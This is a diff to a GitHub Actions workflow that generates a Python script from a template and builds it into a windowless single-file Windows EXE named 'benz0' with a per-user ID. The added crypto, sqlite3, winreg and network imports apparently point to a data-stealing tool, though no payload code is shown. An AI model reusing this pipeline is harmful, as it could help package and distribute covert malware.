@@ -29,8 +29,9 @@ jobs:
         with:
           python-version: '3.10'
 
-      - name: Install PyInstaller
-        run: pip install pyinstaller
+      - name: Install dependencies
+        run: |
+          pip install pyinstaller pycryptodome requests
 
       - name: Generate build script from template
         shell: pwsh
@@ -43,10 +44,37 @@ jobs:
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $template | Out-File -FilePath "${filename}.py" -Encoding utf8
 
-      - name: Build EXE
+      - name: Build EXE with all hidden imports
         run: |
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
-          pyinstaller --onefile --noconsole "${filename}.py"
+          pyinstaller --onefile --noconsole `
+            --hidden-import=Crypto `
+            --hidden-import=Crypto.Cipher `
+            --hidden-import=Crypto.Cipher.AES `
+            --hidden-import=Crypto.Util `
+            --hidden-import=Crypto.Protocol `
+            --hidden-import=requests `
+            --hidden-import=urllib `
+            --hidden-import=urllib.request `
+            --hidden-import=json `
+            --hidden-import=sqlite3 `
+            --hidden-import=zipfile `
+            --hidden-import=shutil `
+            --hidden-import=ctypes `
+            --hidden-import=winreg `
+            --hidden-import=threading `
+            --hidden-import=subprocess `
+            --hidden-import=datetime `
+            --hidden-import=time `
+            --hidden-import=random `
+            --hidden-import=re `
+            --hidden-import=os `
+            --hidden-import=sys `
+            --hidden-import=base64 `
+            --hidden-import=logging `
+            --hidden-import=tempfile `
+            --hidden-import=glob `
+            "${filename}.py"
           $exe_name = "benz0_${{ github.event.inputs.user_id }}.exe"
           if (Test-Path "dist\${filename}.exe") {
             Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
